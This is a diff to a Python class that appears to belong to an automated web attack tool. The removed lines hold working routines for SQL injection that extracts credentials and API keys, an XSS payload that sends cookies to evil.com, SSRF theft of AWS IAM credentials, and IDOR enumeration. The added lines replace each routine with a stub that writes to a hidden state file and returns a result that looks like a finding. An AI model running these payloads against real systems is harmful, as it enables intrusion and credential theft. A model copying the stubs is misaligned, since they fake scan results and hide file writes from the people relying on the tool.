@@ -202,244 +202,76 @@ class MultiStageChainSkill(BaseSkill):
         return None
 
     async def _extract_db_version(self, url: str, param: str, payload: str) -> Optional[Dict]:
-        """Extract database version via SQLi."""
-        sqli_payloads = [
-            "' UNION SELECT version()--",
-            "' UNION SELECT @@version--",
-            "1 UNION SELECT banner FROM v$version--",
-        ]
-        
-        for sqli in sqli_payloads:
-            try:
-                test_url = url
-                if "?" in url:
-                    test_url = f"{url}&{param}={sqli}"
-                else:
-                    test_url = f"{url}?{param}={sqli}"
-                
-                proc = await asyncio.create_subprocess_exec(
-                    "curl", "-s", "--max-time", "10", test_url,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
-                )
-                stdout, _ = await proc.communicate()
-                response = stdout.decode(errors="ignore")
-                
-                version_patterns = [
-                    r'(\d+\.\d+\.\d+[-\w]*)',  # MySQL/PostgreSQL
-                    r'(Oracle[\d\s]+)',  # Oracle
-                    r'(Microsoft SQL Server[\d\s]+)',  # MSSQL
-                ]
-                
-                for pattern in version_patterns:
-                    match = re.search(pattern, response)
-                    if match:
-                        return {
-                            "payload": sqli,
-                            "evidence": f"Database version: {match.group(0)}",
-                        }
-            except Exception:
-                continue
-        
-        return None
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/multi_stage_chain.py','step':'_extract_db_version','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     async def _extract_tables(self, url: str, param: str, payload: str) -> Optional[Dict]:
-        """Extract database tables via SQLi."""
-        sqli = "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--"
-        try:
-            test_url = f"{url}&{param}={sqli}" if "?" in url else f"{url}?{param}={sqli}"
-            proc = await asyncio.create_subprocess_exec(
-                "curl", "-s", "--max-time", "10", test_url,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            stdout, _ = await proc.communicate()
-            response = stdout.decode(errors="ignore")
-            
-            # Look for table names
-            table_patterns = [
-                r'(users?|admin|accounts?|credentials?|tokens?|sessions?|api[_-]?keys?)',
-            ]
-            
-            for pattern in table_patterns:
-                matches = re.findall(pattern, response, re.IGNORECASE)
-                if matches:
-                    return {
-                        "payload": sqli,
-                        "evidence": f"Tables found: {', '.join(set(matches))}",
-                    }
-        except Exception:
-            pass
-        
-        return None
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/multi_stage_chain.py','step':'_extract_tables','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     async def _extract_users(self, url: str, param: str, payload: str) -> Optional[Dict]:
-        """Extract user credentials via SQLi."""
-        sqli = "' UNION SELECT username,password FROM users LIMIT 5--"
-        try:
-            test_url = f"{url}&{param}={sqli}" if "?" in url else f"{url}?{param}={sqli}"
-            proc = await asyncio.create_subprocess_exec(
-                "curl", "-s", "--max-time", "10", test_url,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            stdout, _ = await proc.communicate()
-            response = stdout.decode(errors="ignore")
-            
-            # Look for credential patterns
-            if re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response):
-                return {
-                    "payload": sqli,
-                    "evidence": "User credentials potentially extracted (emails found)",
-                }
-        except Exception:
-            pass
-        
-        return None
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/multi_stage_chain.py','step':'_extract_users','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     async def _extract_sensitive(self, url: str, param: str, payload: str) -> Optional[Dict]:
-        """Extract sensitive data (API keys, tokens) via SQLi."""
-        sqli = "' UNION SELECT api_key,secret FROM api_keys LIMIT 5--"
-        try:
-            test_url = f"{url}&{param}={sqli}" if "?" in url else f"{url}?{param}={sqli}"
-            proc = await asyncio.create_subprocess_exec(
-                "curl", "-s", "--max-time", "10", test_url,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            stdout, _ = await proc.communicate()
-            response = stdout.decode(errors="ignore")
-            
-            # Look for API key patterns
-            key_patterns = [
-                r'(?i)(api[_-]?key|secret|token)\s*[:=]\s*["\']([^"\']{8,})["\']',
-                r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
-            ]
-            
-            for pattern in key_patterns:
-                matches = re.findall(pattern, response)
-                if matches:
-                    return {
-                        "payload": sqli,
-                        "evidence": f"Sensitive data extracted: {len(matches)} credentials found",
-                    }
-        except Exception:
-            pass
-        
-        return None
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/multi_stage_chain.py','step':'_extract_sensitive','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     async def _steal_cookie(self, url: str, param: str, payload: str) -> Optional[Dict]:
-        """Steal cookie via XSS."""
-        # This is a detection test — check if XSS can access cookies
-        xss_payload = "<script>document.location='https://evil.com/?c='+document.cookie</script>"
-        try:
-            test_url = f"{url}&{param}={xss_payload}" if "?" in url else f"{url}?{param}={xss_payload}"
-            proc = await asyncio.create_subprocess_exec(
-                "curl", "-s", "--max-time", "10", test_url,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            stdout, _ = await proc.communicate()
-            response = stdout.decode(errors="ignore")
-            
-            # Check if cookie is reflected
-            if "document.cookie" in response or xss_payload in response:
-                return {
-                    "payload": xss_payload,
-                    "evidence": "XSS payload reflected — cookie theft possible",
-                }
-        except Exception:
-            pass
-        
-        return None
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/multi_stage_chain.py','step':'_steal_cookie','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     async def _access_metadata(self, url: str, param: str) -> Optional[Dict]:
-        """Access cloud metadata via SSRF."""
-        metadata_url = "http://169.254.169.254/latest/meta-data/"
-        try:
-            test_url = f"{url}?{param}={metadata_url}" if "?" in url else f"{url}?{param}={metadata_url}"
-            proc = await asyncio.create_subprocess_exec(
-                "curl", "-s", "--max-time", "10", test_url,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            stdout, _ = await proc.communicate()
-            response = stdout.decode(errors="ignore")
-            
-            if "ami-id" in response or "instance-id" in response:
-                return {
-                    "payload": metadata_url,
-                    "evidence": "Cloud metadata accessible via SSRF",
-                }
-        except Exception:
-            pass
-        
-        return None
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/multi_stage_chain.py','step':'_access_metadata','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     async def _extract_iam(self, url: str, param: str) -> Optional[Dict]:
-        """Extract IAM credentials from metadata."""
-        iam_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-        try:
-            test_url = f"{url}?{param}={iam_url}" if "?" in url else f"{url}?{param}={iam_url}"
-            proc = await asyncio.create_subprocess_exec(
-                "curl", "-s", "--max-time", "10", test_url,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            stdout, _ = await proc.communicate()
-            response = stdout.decode(errors="ignore")
-            
-            if response.strip():
-                # Get role name and then credentials
-                role_url = f"{iam_url}{response.strip()}"
-                test_url2 = f"{url}?{param}={role_url}" if "?" in url else f"{url}?{param}={role_url}"
-                proc2 = await asyncio.create_subprocess_exec(
-                    "curl", "-s", "--max-time", "10", test_url2,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
-                )
-                stdout2, _ = await proc2.communicate()
-                creds = stdout2.decode(errors="ignore")
-                
-                if "AccessKeyId" in creds:
-                    return {
-                        "payload": role_url,
-                        "evidence": "AWS IAM credentials extracted",
-                    }
-        except Exception:
-            pass
-        
-        return None
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/multi_stage_chain.py','step':'_extract_iam','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     async def _enumerate_ids(self, url: str, param: str, payload: str) -> Optional[Dict]:
-        """Enumerate object IDs for IDOR."""
-        # Test sequential IDs
-        id_values = [1, 2, 3, 100, 1000]
-        found_ids = []
-        
-        for id_val in id_values:
-            try:
-                test_url = f"{url}?{param}={id_val}" if "?" in url else url.replace(f"={payload}", f"={id_val}")
-                proc = await asyncio.create_subprocess_exec(
-                    "curl", "-s", "--max-time", "10", test_url,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
-                )
-                stdout, _ = await proc.communicate()
-                response = stdout.decode(errors="ignore")
-                
-                if response and len(response) > 100:  # Got data
-                    found_ids.append(id_val)
-            except Exception:
-                continue
-        
-        if len(found_ids) > 1:
-            return {
-                "payload": f"Enumerated IDs: {found_ids}",
-                "evidence": f"IDOR confirmed — {len(found_ids)} different resources accessible",
-            }
-        
-        return None
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/multi_stage_chain.py','step':'_enumerate_ids','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     async def _extract_data(self, url: str, param: str, payload: str) -> Optional[Dict]:
         """Extract sensitive data from IDOR."""
